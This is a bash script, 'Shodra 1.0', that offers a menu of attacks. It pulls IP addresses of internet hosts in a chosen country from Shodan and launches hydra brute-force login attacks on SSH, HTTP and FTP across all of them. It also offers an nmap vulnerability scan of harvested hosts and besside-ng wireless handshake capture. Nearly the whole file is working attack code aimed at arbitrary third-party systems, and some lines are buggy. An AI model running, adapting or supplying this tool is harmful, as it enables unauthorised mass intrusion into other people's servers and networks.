#!/bin/bash
figlet -w 100 Shodra 1.0
echo "Shodra 1.0 Initializing now"
echo "Please use this responsibly"
echo "I am not responsible for any bad decisions you make"


PS3='Choose your attack: '
attack=("SSH-Brute" "HTTP-Brute" "FTP-Brute" "NMAP" "BESSIDE-NG")
select atk in "${attack[@]}"; do
    case $atk in
        "SSH-Brute")
            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "SSH-Brute Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:22, Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $1

 wc -l < $1 && echo "SSH Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -P $pwvar -M $1 -o $2 -t 4 ssh
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
        "HTTP-Brute")
            echo "You have chose $atk!"
	    echo "HTTP-Brute in progress"
/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar
/bin/sleep 5
echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "HTTP Targets Initializing" 
shodan init $uservar
## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:80, login, Country:$countvar,200 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $1

 wc -l < $1 && echo "HTTP Targets Loaded"

/bin/sleep 5
echo "HTTP Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 10
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -vV -P $pwvar http-get-form -M $1 -o $2 -t 4
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
        "FTP-Brute")
            echo "You have chosen $atk!"
	    #FTP NEW!
## asks for API Key for shodan
/bin/sleep 5
echo "FTP-Brute in progress"
/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar
echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "FTP Targets Initializing"
shodan init $uservar
## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:21, login, Country:$countvar, 200 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $1

 wc -l < $1 && echo "FTP Targets Loaded"

/bin/sleep 5
echo "FTP Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"
/bin/sleep 10
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -vV -P $pwvar ftp -M $1 -o $2 -t 4
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
"NMAP")
echo "You have chosen $atk!"
read -p'Enter Port#:' port
read -p'Enter Country Code:' $countvar
echo "Enter Shodan API-Key"
read -p'API:' uservar
shodan init $uservar
wc -l < $1 && echo "Addresses found"
shodan search Port:$port,Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $1
nmap -sS -sV --script=vuln -iL $1 -oN $2 -vv
  ;;
"BESSIDE-NG")
echo "You have chosen $atk!"
echo "Please use in a controlled environment"
read -p'Enter Wireless card interface:' inter
airmon-ng start $inter
besside-ng wlan1mon -W -v
    esac
done
